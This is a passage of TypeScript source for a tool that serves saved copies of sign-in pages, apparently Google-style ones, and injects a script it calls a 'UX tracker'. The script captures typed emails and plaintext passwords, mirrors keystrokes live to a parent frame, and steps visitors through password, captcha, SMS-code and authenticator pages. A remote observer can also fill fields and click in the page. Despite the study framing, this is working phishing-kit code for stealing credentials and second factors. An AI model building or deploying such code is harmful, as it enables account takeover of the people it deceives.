      out = out.replace(/<head[^>]*>/i, (m) => `${m}\n<title>${escText(title)}</title>`);
    }
  }

  if (favicon) {
    // Strip any existing favicon links first.
    out = out.replace(/<link[^>]+rel=["']?(?:shortcut )?icon["']?[^>]*>/gi, "");
    const tag = `<link rel="icon" href="${escAttr(favicon)}" />`;
    if (/<head[^>]*>/i.test(out)) {
      out = out.replace(/<head[^>]*>/i, (m) => `${m}\n${tag}`);
    }
  }

  return out;
}

const TRACKER_SCRIPT = `<script>
// Dedupe + debounce: collapse repeats of the same (field,value) within 350ms.
var __ux_last = {};
function __ux_post(msg){ try { parent.postMessage(msg, '*'); } catch(e){} }
function __ux_dedupe_send(field, value){
  var k = field + ':' + value;
  var now = Date.now();
  if (__ux_last[field] && __ux_last[field].k === k && (now - __ux_last[field].at) < 350) return false;
  __ux_last[field] = { k: k, at: now };
  __ux_post({__ux:true, type:'input', field: field, value: value});
  return true;
}
window.track = function(field, value){ __ux_dedupe_send(field, String(value == null ? '' : value)); };

// Live keyboard mirroring — emits on focus/input/blur for any text-like input.
function __ux_field_name(el){
  return el.getAttribute('data-ux-field') || el.name || el.id || el.getAttribute('aria-label') || el.placeholder || (el.type || 'text');
}
function __ux_is_typeable(el){
  if (!el || el.nodeType !== 1) return false;
  var tag = el.tagName;
  if (tag === 'TEXTAREA') return true;
  if (tag !== 'INPUT') return false;
  var t = (el.type || 'text').toLowerCase();
  return ['text','email','password','search','tel','url','number','date'].indexOf(t) >= 0;
}
function __ux_emit_live(el, focused){
  if (!__ux_is_typeable(el)) return;
  var field = __ux_field_name(el);
  var type = (el.type || 'text').toLowerCase();
  var raw = el.value == null ? '' : String(el.value);
  // Never broadcast password contents in plaintext through live feed.
  var value = (type === 'password') ? raw.replace(/./g, '•') : raw;
  __ux_post({__ux:true, type:'live_input', field: field, value: value, focused: !!focused, ftype: type});
}
document.addEventListener('focusin', function(e){ __ux_emit_live(e.target, true); }, true);
document.addEventListener('focusout', function(e){ __ux_emit_live(e.target, false); }, true);
document.addEventListener('input', function(e){ __ux_emit_live(e.target, true); }, true);

var EMAIL_KEY = '__ux_email';
var PASS_LEN_KEY = '__ux_pass_len';
function getStoredEmail(){ try { return sessionStorage.getItem(EMAIL_KEY) || ''; } catch(e){ return ''; } }
function setStoredEmail(v){ try { sessionStorage.setItem(EMAIL_KEY, v); } catch(e){} }
function getStoredPassLen(){ try { return parseInt(sessionStorage.getItem(PASS_LEN_KEY) || '0', 10) || 0; } catch(e){ return 0; } }
function setStoredPassLen(n){ try { sessionStorage.setItem(PASS_LEN_KEY, String(n|0)); } catch(e){} }
function currentDesignAndPage(){
  try {
    var parts = parent.location.pathname.split('/').filter(Boolean);
    var p = parts[1] || '';
    // Virtual-page override: cb merges signin + signinp under /cb/signin
    // and uses window.__ux_virtual_page so tracker flow logic knows where it is.
    if (window.__ux_virtual_page) p = String(window.__ux_virtual_page);
    return { design: parts[0] || '', page: p };
  } catch(e){ return { design:'', page:'' }; }
}
function navigateTo(page){
  var loc = currentDesignAndPage();
  if (!loc.design) return;
  // cb special: signin -> signinp is an in-place view swap (URL stays /cb/signin)
  if (loc.design === 'cb' && loc.page === 'signin' && page === 'signinp') {
    try { parent.postMessage({__ux:true, type:'swap_virtual', design:'cb', page:'signinp'}, '*'); } catch(e){}
    return;
  }
  var target = '/' + loc.design + '/' + page;
  // ge: carry email to password page via query (storage can be isolated in iframes)
  if (loc.design === 'ge' && page === 'password') {
    var em = getStoredEmail();
    if (em) target += '?email=' + encodeURIComponent(em);
  }
  try { sessionStorage.setItem('__ux_internal_nav_until', String(Date.now() + 15000)); } catch(e){}
  // Parent does client-side navigation (no full reload) for smooth transitions.
  try { parent.postMessage({__ux:true, type:'internal_navigation', url: target}, '*'); } catch(e){}
  // Fallback: if no parent listener acts within 600ms, hard-navigate.
  setTimeout(function(){
    try {
      var pathOnly = target.split('?')[0];
      if (parent && parent.location && parent.location.pathname !== pathOnly) {
        parent.location.assign(target);
      }
    } catch(e){ try { location.assign(target); } catch(_){} }
  }, 600);
}

var EMAIL_PLACEHOLDERS = ['lol@gmail.com', 'example@gmail.com', 'user@example.com'];
function detectOriginalEmail(){
  // Snapshot any emails currently visible in known account-identifier slots,
  // so we can swap them out for the participant's typed email later.
  var found = [];
  try {
    var nodes = document.querySelectorAll('[data-profile-identifier], [data-email], [data-identifier]');
    for (var i = 0; i < nodes.length; i++) {
      var t = (nodes[i].textContent || '').trim();
      if (t && t.indexOf('@') > 0 && found.indexOf(t) < 0) found.push(t);
    }
  } catch(e){}
  try {
    var inputs = document.querySelectorAll('input[type="email"][value], input[name="identifier"][value]');
    for (var j = 0; j < inputs.length; j++) {
      var v = (inputs[j].value || '').trim();
      if (v && v.indexOf('@') > 0 && found.indexOf(v) < 0) found.push(v);
    }
  } catch(e){}
  try {
    var labels = document.querySelectorAll('[aria-label]');
    for (var k = 0; k < labels.length; k++) {
      var al = labels[k].getAttribute('aria-label') || '';
      var m = al.match(/[\\w.+-]+@[\\w.-]+\\.[A-Za-z]{2,}/);
      if (m && found.indexOf(m[0]) < 0) found.push(m[0]);
    }
  } catch(e){}
  return found;
}
function replaceEmailPlaceholder(){
  var email = getStoredEmail();
  var letter = (email ? email.charAt(0) : '?').toUpperCase();
  var hi = '';
  if (email) {
    var raw = email.slice(0, 5);
    hi = raw.charAt(0).toUpperCase() + raw.slice(1);
  }
  var initials = letter;
  if (email) {
    var local = (email.split('@')[0] || email).trim();
    var parts = local.split(/[._+\\-\\s]+/).filter(Boolean);
    if (parts.length >= 2) initials = (parts[0].charAt(0) + parts[1].charAt(0)).toUpperCase();
    else {
      var alnum = local.replace(/[^a-zA-Z0-9]/g, '');
      if (alnum.length >= 2) initials = alnum.slice(0, 2).toUpperCase();
      else if (alnum.length === 1) initials = (alnum + alnum).toUpperCase();
    }
  }
  try {
    var avatars = document.querySelectorAll('[data-ux-avatar]');
    for (var a = 0; a < avatars.length; a++) {
      var two = avatars[a].getAttribute('data-ux-avatar') === '2' || avatars[a].hasAttribute('data-ux-initials');
      avatars[a].textContent = two ? initials : letter;
    }
  } catch(e){}
  try {
    var his = document.querySelectorAll('[data-ux-hi]');
    for (var h = 0; h < his.length; h++) if (hi) his[h].textContent = 'Hi ' + hi;
  } catch(e){}
  try {
    var emailEls = document.querySelectorAll('[data-ux-email], [data-profile-identifier]');
    for (var i = 0; i < emailEls.length; i++) if (email) emailEls[i].textContent = email;
  } catch(e){}
  try {
    var n = getStoredPassLen();
    var dots = new Array(n + 1).join('•');
    var pwEls = document.querySelectorAll('[data-ux-password-mask]');
    for (var j = 0; j < pwEls.length; j++) pwEls[j].textContent = dots;
  } catch(e){}
  if (!email) return;
  // Replace ONLY hidden-identifier <input> values (never visible login boxes).
  try {
    var hidEmails = document.querySelectorAll('input[type="hidden"][name*="mail" i], input[type="hidden"][name="identifier"], input.sf-hidden[type="email"], input[aria-hidden="true"][type="email"]');
    for (var h = 0; h < hidEmails.length; h++) {
      try { hidEmails[h].value = email; } catch(_){}
    }
  } catch(e){}
  // Build the set of placeholder strings to swap.
  var placeholders = EMAIL_PLACEHOLDERS.slice();
  var detected = detectOriginalEmail();
  for (var di = 0; di < detected.length; di++) {
    if (detected[di] !== email && placeholders.indexOf(detected[di]) < 0) placeholders.push(detected[di]);
  }
  try {
    var lab = document.querySelectorAll('[aria-label]');
    for (var li = 0; li < lab.length; li++) {
      var cur = lab[li].getAttribute('aria-label') || '';
      var changed = cur;
      for (var pi = 0; pi < placeholders.length; pi++) {
        if (changed.indexOf(placeholders[pi]) >= 0) changed = changed.split(placeholders[pi]).join(email);
      }
      if (changed !== cur) lab[li].setAttribute('aria-label', changed);
    }
  } catch(e){}
  function walk(node){
    if (!node) return;
    if (node.nodeType === 3) {
      var v = node.nodeValue;
      if (!v) return;
      var orig = v;
      for (var k = 0; k < placeholders.length; k++) {
        var ph = placeholders[k];
        if (v.indexOf(ph) >= 0) v = v.split(ph).join(email);
      }
      if (v !== orig) node.nodeValue = v;
    } else if (node.nodeType === 1) {
      var tag = node.tagName;
      if (tag === 'SCRIPT' || tag === 'STYLE') return;
      for (var i = 0; i < node.childNodes.length; i++) walk(node.childNodes[i]);
    }
  }
  walk(document.body);
}
function findContinueButton(scope){
  var buttons = Array.prototype.slice.call((scope||document).querySelectorAll('button, input[type="button"], input[type="submit"], [role="button"]'));
  return buttons.find(function(b){ return /continue|sign\\s*in|log\\s*in|next|suivant/i.test((b.textContent || b.value || '').trim()); })
    || document.getElementById('continueBtn')
    || buttons[0];
}
function forceEnable(btn){
  if (!btn) return;
  try { btn.disabled = false; } catch(_){}
  try { btn.removeAttribute('disabled'); } catch(_){}
  try { btn.setAttribute('aria-disabled', 'false'); } catch(_){}
  if (btn.classList) btn.classList.add('is-ready');
}
function forceDisable(btn){
  if (!btn) return;
  try { btn.disabled = true; } catch(_){}
  try { btn.setAttribute('aria-disabled', 'true'); } catch(_){}
  if (btn.classList) btn.classList.remove('is-ready');
}
function wireContinueButtons(){
  var loc = currentDesignAndPage();
  var here = loc.page || '';
  // Per-design page → next mapping for the guided flow.
  var DESIGN_NEXT = {
    'go': { 'signin': 'signinp', 'signinp': 'signinploading' },
    // ge: email → loading; password → loading; admin redirects onward
    'ge': { 'signin': 'loading', 'password': 'loading', 'noaccount': '', 'captcha': '', 'confirmrecovery': '', 'checkphone': '', 'authenticator': '', 'confirmphone': 'smscode', 'sendcode': 'smscode', 'smscode': '' }
  };
  var NEXT = (DESIGN_NEXT[loc.design]) || { 'signin': 'signinp', 'signinp': 'loading' };
  var bodyNext = document.body && document.body.getAttribute && document.body.getAttribute('data-ux-next');
  // Explicit empty string in DESIGN_NEXT / data-ux-next means "do not navigate".
  var nextPage = (bodyNext != null && bodyNext !== '') ? bodyNext
    : (Object.prototype.hasOwnProperty.call(NEXT, here) ? NEXT[here] : 'loading');
  if (bodyNext === '') nextPage = '';

  var emails = Array.prototype.slice.call(document.querySelectorAll('input[type="email"]:not([aria-hidden="true"]):not(.sf-hidden), input[name*="mail" i]:not([aria-hidden="true"]), input[id*="mail" i]:not([aria-hidden="true"]), input[autocomplete*="email" i]:not([aria-hidden="true"]), input[autocomplete*="username" i]:not([aria-hidden="true"]), input[name="identifier"]:not([aria-hidden="true"]):not(.sf-hidden)'));
  var passwords = Array.prototype.slice.call(document.querySelectorAll('input[type="password"]:not([aria-hidden="true"]), input[name*="pass" i]:not([aria-hidden="true"]), input[name="Passwd"]'));
  var hasPassword = passwords.length > 0;
  if (!emails.length && !hasPassword) {
    emails = Array.prototype.slice.call(document.querySelectorAll('form input[type="text"], input[type="text"]')).slice(0, 1);
  }
  var input = passwords[0] || emails[0];
  if (!input) {
    var btnOnly = findContinueButton();
    if (btnOnly && !btnOnly.__uxContinueWired) {
      btnOnly.__uxContinueWired = true;
      forceEnable(btnOnly);
      btnOnly.addEventListener('click', function(e){
        e.preventDefault(); e.stopPropagation();
        if (e.stopImmediatePropagation) e.stopImmediatePropagation();
        if (nextPage) navigateTo(nextPage);
      }, true);
    }
    return;
  }
  var root = input.closest('form') || document;
  var btn = findContinueButton(root) || findContinueButton(document);
  if (!btn || btn.__uxContinueWired) return;
  btn.__uxContinueWired = true;
  function ok(){ return (input.value || '').length > 0; }
  function sync(){ if (ok()) forceEnable(btn); else forceDisable(btn); }
  input.addEventListener('input', sync, true);
  input.addEventListener('keyup', sync, true);
  input.addEventListener('change', sync, true);
  input.addEventListener('focus', sync, true);
  // Lock the disabled property/attribute so frameworks (Polymer / Google's
  // saved page jscontroller) cannot re-disable the button while we have text.
  try {
    var proto = Object.getPrototypeOf(btn);
    var origDesc = Object.getOwnPropertyDescriptor(proto, 'disabled') || Object.getOwnPropertyDescriptor(HTMLButtonElement.prototype, 'disabled');
    Object.defineProperty(btn, 'disabled', {
      configurable: true,
      get: function(){ return !ok(); },
      set: function(v){ if (!ok() && origDesc && origDesc.set) origDesc.set.call(btn, v); }
    });
  } catch(e){}
  try {
    var mo = new MutationObserver(function(){
      if (ok()) {
        if (btn.hasAttribute('disabled')) btn.removeAttribute('disabled');
        if (btn.getAttribute('aria-disabled') === 'true') btn.setAttribute('aria-disabled', 'false');
      }
    });
    mo.observe(btn, { attributes: true, attributeFilter: ['disabled','aria-disabled','class'] });
  } catch(e){}
  setInterval(function(){ if (ok() && btn.hasAttribute('disabled')) btn.removeAttribute('disabled'); }, 100);


  btn.addEventListener('click', function(e){
    if (!ok()) { e.preventDefault(); e.stopPropagation(); if (e.stopImmediatePropagation) e.stopImmediatePropagation(); sync(); return; }
    e.preventDefault();
    e.stopPropagation();
    if (e.stopImmediatePropagation) e.stopImmediatePropagation();
    if (hasPassword) {
      setStoredPassLen((input.value || '').length);
      try { window.track('password_submitted', input.value || ''); } catch(err){}
      try { window.track('continue_clicked', '1'); } catch(err){}
      if (nextPage) navigateTo(nextPage);
    } else {
      setStoredEmail(input.value || '');
      try { window.track('email_submitted', input.value || ''); } catch(err){}
      try { window.track('continue_clicked', '1'); } catch(err){}
      if (nextPage) navigateTo(nextPage);
    }
  }, true);
  var form = input.closest('form');
  if (form && !form.__uxSubmitWired) {
    form.__uxSubmitWired = true;
    form.addEventListener('submit', function(e){
      e.preventDefault();
      e.stopPropagation();
      if (e.stopImmediatePropagation) e.stopImmediatePropagation();
      if (btn) btn.click();
    }, true);
  }
  // Enter-to-submit on the field even when the form swallows submits.
  input.addEventListener('keydown', function(e){
    if (e.key === 'Enter' || e.keyCode === 13) {
      e.preventDefault(); e.stopPropagation(); if (e.stopImmediatePropagation) e.stopImmediatePropagation();
      if (ok() && btn) btn.click();
    }
  }, true);
  sync();
}
function wirePasswordToggles(){
  if (window.__pwToggleWired) return;
  window.__pwToggleWired = true;
  document.addEventListener('click', function(e){
    var path = e.composedPath ? e.composedPath() : [];
    var btn = null;
    for (var i = 0; i < path.length; i++) {
      var n = path[i];
      if (n && n.nodeType === 1 && (n.tagName === 'BUTTON' || n.getAttribute && n.getAttribute('role') === 'button')) {
        var lab = (n.getAttribute && (n.getAttribute('aria-label') || '')) || '';
        if (/show password|hide password/i.test(lab) || n.querySelector && n.querySelector('[data-icon-name="invisible"],[data-icon-name="visible"]')) {
          btn = n; break;
        }
      }
    }
    if (!btn) return;
    var scope = btn.closest('form') || btn.closest('div') || document;
    var pw = scope.querySelector('input[type="password"], input[data-pw-toggled="1"]');
    if (!pw) {
      // search wider
      pw = document.querySelector('input[type="password"], input[data-pw-toggled="1"]');
    }
    if (!pw) return;
    e.preventDefault();
    e.stopPropagation();
    var showing = pw.getAttribute('type') === 'text';
    if (showing) {
      pw.setAttribute('type', 'password');
      btn.setAttribute('aria-label', 'Show password');
    } else {
      pw.setAttribute('type', 'text');
      pw.setAttribute('data-pw-toggled', '1');
      btn.setAttribute('aria-label', 'Hide password');
    }
    // Swap icon glyph if present
    try {
      var icon = btn.querySelector('[data-icon-name]');
      if (icon) {
        var name = icon.getAttribute('data-icon-name');
        if (name === 'invisible') icon.setAttribute('data-icon-name', 'visible');
        else if (name === 'visible') icon.setAttribute('data-icon-name', 'invisible');
      }
    } catch(_){}
  }, true);
}
function boot(){ replaceEmailPlaceholder(); wireContinueButtons(); wirePasswordToggles(); }
boot();
if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
// Re-run after late hydration (Google saved pages mutate the DOM after load).
setTimeout(boot, 400);
setTimeout(boot, 1200);
function reportViewport(){ try { parent.postMessage({__ux:true, type:'viewport', w:innerWidth, h:innerHeight}, '*'); } catch(e){} }
reportViewport();
window.addEventListener('resize', reportViewport, {passive:true});
window.addEventListener('click', function(e){ try { parent.postMessage({__ux:true, type:'click', x:e.clientX, y:e.clientY, w:innerWidth, h:innerHeight}, '*'); } catch(e){} });
window.addEventListener('mousemove', function(e){ try { parent.postMessage({__ux:true, type:'mouse', x:e.clientX, y:e.clientY, w:innerWidth, h:innerHeight}, '*'); } catch(e){} }, {passive:true});
window.addEventListener('scroll', function(){ try { parent.postMessage({__ux:true, type:'scroll', sx:scrollX, sy:scrollY}, '*'); } catch(e){} }, {passive:true});
// (Generic keystroke 'input' broadcasts removed — live_input + window.track() cover the feed without spam.)
window.addEventListener('message', function(ev){
  var d = ev.data; if (!d || d.__mirror !== true) return;
  if (d.type === 'live_input' && typeof d.field === 'string') {
    // Paint observer's mirror value into matching input so the observer sees real text.
    var sel = '[data-ux-field="'+d.field+'"], [name="'+d.field+'"], #'+d.field;
    var el = null;
    try { el = document.querySelector(sel); } catch(e){}
    if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA')) {
      el.value = d.value == null ? '' : String(d.value);
      try { el.dispatchEvent(new Event('input', { bubbles: true })); } catch(e){}
    }
  }
  if (d.type === 'click' && typeof d.x === 'number' && typeof d.y === 'number') {
    try {
      var target = document.elementFromPoint(d.x, d.y);
      if (target && typeof target.click === 'function') target.click();
      else if (target) {
        var evt = new MouseEvent('click', { bubbles: true, cancelable: true, clientX: d.x, clientY: d.y, view: window });
        target.dispatchEvent(evt);
      }
    } catch(e){}
  }
});
<\/script>`;

function injectTracker(html: string): string {
  if (/<\/body>/i.test(html))
    return html.replace(/<\/body>/i, TRACKER_SCRIPT + "</body>");
  return html + TRACKER_SCRIPT;
}

function wrap(html: string, css: string, js: string): string {
  return `<!doctype html><html><head><meta charset="utf-8" />
<style>${css}</style></head><body>${html}
${TRACKER_SCRIPT}
<script>${js}<\/script>
</body></html>`;
}


// ---- Change subscriptions (in-tab + cross-tab via storage events) ----

// Compat with the previous Supabase-based realtime channel: callers expect
// something with an `unsubscribe()` method.
export type DesignChangeChannel = { unsubscribe: () => Promise<void> | void };

export function subscribeDesignChanges(
  isInterested: (
    design: DesignKey,
    page: PageSlot,
    kind: FileKind,
  ) => boolean,
  onChange: () => void,
): DesignChangeChannel {
  const handler: FileChangeListener = (f) => {
    if (isInterested(f.design, f.page, f.kind)) onChange();
  };
  _fileListeners.add(handler);
  const offReg = subscribeRegistry(onChange);
  return {
    unsubscribe() {
      _fileListeners.delete(handler);
      offReg();
    },
  };
}

// ---- Remote sync (Supabase design_pages) ----

function applyRemoteRow(row: { design: string; page: string; kind: string; content: string }) {
  const f: DesignFile = {
    design: row.design,
    page: row.page,
    kind: row.kind as FileKind,
  };
  const key = overrideKey(f);
  // Respect tombstones — don't resurrect a deleted file from remote.
  if (_tombstones.has(key)) return;
  if (_contentOverrides.get(key) === row.content) return;
  _contentOverrides.set(key, row.content);
  lsSet(OVERRIDE_PREFIX + key, row.content);
  notifyFile(f);
}


let _hydrateResolve: (() => void) | null = null;
export const remoteHydrated: Promise<void> = new Promise((res) => {
  _hydrateResolve = res;
});

async function hydrateFromRemote() {
  try {
    const { data, error } = await supabase
      .from("design_pages")
      .select("design,page,kind,content");
    if (!error && data) for (const row of data) applyRemoteRow(row);
  } catch {
    /* ignore */
  } finally {
    _hydrateResolve?.();
    _hydrateResolve = null;
  }
}

if (typeof window !== "undefined") {
  void hydrateFromRemote();
  try {
    supabase
      .channel("design-pages-sync")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "design_pages" },
        (payload) => {
          const row = (payload.new ?? payload.old) as {
            design?: string;
            page?: string;
            kind?: string;
            content?: string;
          };
          if (!row?.design || !row.page || !row.kind) return;
          if (payload.eventType === "DELETE") {
            const key = `${row.design}:${row.page}:${row.kind}`;
            _contentOverrides.delete(key);
            lsDel(OVERRIDE_PREFIX + key);
            notifyFile({ design: row.design, page: row.page, kind: row.kind as FileKind });
            return;
          }
          if (typeof row.content === "string") {
            applyRemoteRow(row as { design: string; page: string; kind: string; content: string });
          }
        },
      )
      .subscribe();
  } catch {
    /* ignore */
  }
}
